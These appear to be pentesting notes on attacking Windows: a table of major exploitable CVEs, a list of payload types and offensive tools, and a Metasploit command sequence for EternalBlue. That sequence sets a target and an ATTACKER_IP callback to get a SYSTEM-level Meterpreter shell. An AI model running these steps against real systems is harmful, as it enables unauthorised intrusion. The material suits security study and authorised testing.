# Infiltrating Windows
```table-of-contents
```
## Prominent Windows Exploits
| **Vulnerability**  | **CVE / MS-ID**      | **Description**                                                                          |
| -------------- | ---------------- | ------------------------------------------------------------------------------------ |
| MS08-067       | `CVE-2008-4250`  | Critical SMB flaw allowing RCE. Famous for Conficker worm.                           |
| EternalBlue    | `MS17-010`       | Leaked NSA exploit targeting SMBv1. Allows RCE as SYSTEM. Used in WannaCry.          |
| BlueKeep       | `CVE-2019-0708`  | Critical RCE in RDP (Remote Desktop) pre-auth.                                       |
| Zerologon      | `CVE-2020-1472`  | Flaw in Netlogon crypto. Allows unauthenticated attacker to become Domain Admin.     |
| Sigred         | `CVE-2020-1350`  | RCE in Windows DNS Server. Can lead to Domain Admin.                                 |
| PrintNightmare | `CVE-2021-34527` | RCE/LPE in Print Spooler service.                                                    |
| SeriousSam     | `CVE-2021-36924` | (HiveNightmare) Allows reading SAM/SYSTEM hives from Shadow Copies as low-priv user. |
## Windows Payload Types
- **DLL (.dll):** Dynamic Link Libraries. Used for injection or hijacking to escalate privileges.
- **Batch (.bat):** Simple DOS scripts. Good for basic automation or initial callbacks.
- **VBScript (.vbs):** Legacy scripting. Often used in Phishing (Macros).
- **MSI (.msi):** Installer databases. Executed via `msiexec`. Can trigger high-privilege shells during installation.
- **PowerShell (.ps1):** The standard for modern Windows exploitation. Supports .NET, memory execution, and heavy automation.
## Payload Generation Tools
- **MSFVenom:** The standard for generating shellcode/executables.    
- **PayloadsAllTheThings:** GitHub repository with manual payloads.
- **Nishang:** PowerShell offensive framework.
- **Mythic C2:** Modern Command & Control framework.
## MS17-010 (EternalBlue)
```shell
# 1. Search for the module
msf6 > search eternal

# 2. Select the Psexec version (More stable)
msf6 > use exploit/windows/smb/ms17_010_psexec

# 3. Configure Options
msf6 > set RHOSTS <TARGET_IP>
msf6 > set LHOST <ATTACKER_IP>
msf6 > set LPORT 4444

# 4. Exploit
msf6 > exploit

# Result: Meterpreter Session as NT AUTHORITY\SYSTEM
```